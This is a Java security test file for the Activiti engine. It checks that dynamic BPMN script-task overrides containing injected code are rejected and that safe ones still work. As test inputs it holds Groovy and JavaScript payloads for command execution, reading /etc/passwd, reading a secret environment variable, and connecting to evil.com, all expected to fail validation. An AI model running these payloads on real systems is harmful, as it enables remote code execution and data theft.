/*
 * Copyright 2010-2026 Hyland Software, Inc. and its affiliates.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.activiti.engine.test.bpmn.scripttask;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import com.fasterxml.jackson.databind.node.ObjectNode;
import org.activiti.engine.ActivitiException;
import org.activiti.engine.impl.scripting.ScriptContentValidator;
import org.activiti.engine.impl.test.PluggableActivitiTestCase;
import org.activiti.engine.impl.util.CollectionUtil;
import org.activiti.engine.runtime.ProcessInstance;
import org.activiti.engine.test.Deployment;

/**
 * Security tests for Dynamic BPMN Script Injection vulnerability.
 *
 * Verifies that malicious scripts injected via DynamicBpmnService.changeScriptTaskScript()
 * are rejected, while legitimate dynamic script overrides continue to work.
 */
public class DynamicScriptTaskSecurityTest extends PluggableActivitiTestCase {

    // ========================================================================
    // ScriptContentValidator unit tests
    // ========================================================================

    public void testRejectRuntimeExec() {
        assertThatThrownBy(() ->
            ScriptContentValidator.validate("Runtime.getRuntime().exec('calc')")
        ).isInstanceOf(ActivitiException.class)
         .hasMessageContaining("Script content validation failed");
    }

    public void testRejectGroovyProcessExecution() {
        String maliciousGroovy =
            "def process = 'open /System/Applications/Calculator.app'.execute()\n" +
            "process.waitFor()\n" +
            "execution.setVariable('scriptOutput', 'RCE_ACHIEVED')";
        assertThatThrownBy(() ->
            ScriptContentValidator.validate(maliciousGroovy)
        ).isInstanceOf(ActivitiException.class)
         .hasMessageContaining("Script content validation failed");
    }

    public void testRejectProcessBuilder() {
        assertThatThrownBy(() ->
            ScriptContentValidator.validate("new ProcessBuilder(['cmd', '/c', 'whoami']).start()")
        ).isInstanceOf(ActivitiException.class)
         .hasMessageContaining("Script content validation failed");
    }

    public void testRejectSystemExit() {
        assertThatThrownBy(() ->
            ScriptContentValidator.validate("System.exit(0)")
        ).isInstanceOf(ActivitiException.class)
         .hasMessageContaining("Script content validation failed");
    }

    public void testRejectReflection() {
        assertThatThrownBy(() ->
            ScriptContentValidator.validate(
                "Class.forName('java.lang.Runtime').getMethod('exec', String.class).invoke(null, 'id')"
            )
        ).isInstanceOf(ActivitiException.class)
         .hasMessageContaining("Script content validation failed");
    }

    public void testRejectFileAccess() {
        assertThatThrownBy(() ->
            ScriptContentValidator.validate("new File('/etc/passwd').text")
        ).isInstanceOf(ActivitiException.class)
         .hasMessageContaining("Script content validation failed");
    }

    public void testRejectNetworkAccess() {
        assertThatThrownBy(() ->
            ScriptContentValidator.validate("new java.net.URL('http://evil.com').text")
        ).isInstanceOf(ActivitiException.class)
         .hasMessageContaining("Script content validation failed");
    }

    public void testRejectSocketAccess() {
        assertThatThrownBy(() ->
            ScriptContentValidator.validate("new java.net.Socket('evil.com', 4444)")
        ).isInstanceOf(ActivitiException.class)
         .hasMessageContaining("Script content validation failed");
    }

    public void testRejectThreadCreation() {
        assertThatThrownBy(() ->
            ScriptContentValidator.validate("new Thread({ Runtime.getRuntime() }).start()")
        ).isInstanceOf(ActivitiException.class)
         .hasMessageContaining("Script content validation failed");
    }

    public void testRejectClassLoader() {
        assertThatThrownBy(() ->
            ScriptContentValidator.validate("new URLClassLoader(new URL[]{})")
        ).isInstanceOf(ActivitiException.class)
         .hasMessageContaining("Script content validation failed");
    }

    public void testRejectScriptEngineEscape() {
        assertThatThrownBy(() ->
            ScriptContentValidator.validate(
                "new javax.script.ScriptEngineManager().getEngineByName('groovy').eval('...')"
            )
        ).isInstanceOf(ActivitiException.class)
         .hasMessageContaining("Script content validation failed");
    }

    public void testRejectGetClassReflection() {
        assertThatThrownBy(() ->
            ScriptContentValidator.validate(
                "execution.getClass().getMethod('toString').invoke(execution)"
            )
        ).isInstanceOf(ActivitiException.class)
         .hasMessageContaining("Script content validation failed");
    }

    public void testRejectSystemGetenv() {
        assertThatThrownBy(() ->
            ScriptContentValidator.validate("System.getenv('SECRET_KEY')")
        ).isInstanceOf(ActivitiException.class)
         .hasMessageContaining("Script content validation failed");
    }

    public void testAllowSafeScript() {
        // These should NOT throw
        ScriptContentValidator.validate("var sum = a + b; execution.setVariable('result', sum);");
        ScriptContentValidator.validate("execution.setVariable('greeting', 'hello world');");
        ScriptContentValidator.validate("var x = 1 + 2;\nvar y = x * 3;\nexecution.setVariable('output', y);");
        ScriptContentValidator.validate(null);
        ScriptContentValidator.validate("");
    }

    // ========================================================================
    // DynamicBpmnService integration tests
    // ========================================================================

    public void testChangeScriptTaskScriptRejectsMaliciousPayload() {
        // Groovy RCE payload from the vulnerability report
        String maliciousGroovy =
            "def process = 'open /System/Applications/Calculator.app'.execute()\n" +
            "process.waitFor()\n" +
            "execution.setVariable('scriptOutput', 'RCE_ACHIEVED')";

        assertThatThrownBy(() ->
            dynamicBpmnService.changeScriptTaskScript("safeScriptTask", maliciousGroovy)
        ).isInstanceOf(ActivitiException.class)
         .hasMessageContaining("Script content validation failed");
    }

    public void testChangeScriptTaskScriptRejectsRuntimeExecPayload() {
        String malicious = "var rt = java.lang.Runtime.getRuntime(); rt.exec('whoami');";

        assertThatThrownBy(() ->
            dynamicBpmnService.changeScriptTaskScript("someTask", malicious)
        ).isInstanceOf(ActivitiException.class)
         .hasMessageContaining("Script content validation failed");
    }

    public void testChangeScriptTaskScriptWithInfoNodeRejectsMalicious() {
        ObjectNode infoNode = processEngineConfiguration.getObjectMapper().createObjectNode();
        String malicious = "new ProcessBuilder(['sh', '-c', 'id']).start()";

        assertThatThrownBy(() ->
            dynamicBpmnService.changeScriptTaskScript("someTask", malicious, infoNode)
        ).isInstanceOf(ActivitiException.class)
         .hasMessageContaining("Script content validation failed");
    }

    // ========================================================================
    // Integration test: safe dynamic override still works
    // ========================================================================

    @Deployment
    public void testSafeDynamicScriptOverride() {
        // First: run the original script (a + b)
        ProcessInstance processInstance = runtimeService.startProcessInstanceByKey(
            "testSecureDynamicScript",
            CollectionUtil.map("a", 10, "b", 20)
        );
        assertThat(((Number) runtimeService.getVariable(processInstance.getId(), "result")).intValue())
            .isEqualTo(30);
        taskService.complete(taskService.createTaskQuery().singleResult().getId());
        assertProcessEnded(processInstance.getId());

        // Now override with a safe script (c * d)
        String processDefinitionId = processInstance.getProcessDefinitionId();
        ObjectNode infoNode = dynamicBpmnService.changeScriptTaskScript(
            "safeScriptTask",
            "var product = c * d;\nexecution.setVariable('result', product);"
        );
        dynamicBpmnService.saveProcessDefinitionInfo(processDefinitionId, infoNode);

        // Run with the overridden script
        processInstance = runtimeService.startProcessInstanceByKey(
            "testSecureDynamicScript",
            CollectionUtil.map("c", 5, "d", 7)
        );
        assertThat(((Number) runtimeService.getVariable(processInstance.getId(), "result")).intValue())
            .isEqualTo(35);
        taskService.complete(taskService.createTaskQuery().singleResult().getId());
        assertProcessEnded(processInstance.getId());
    }
}
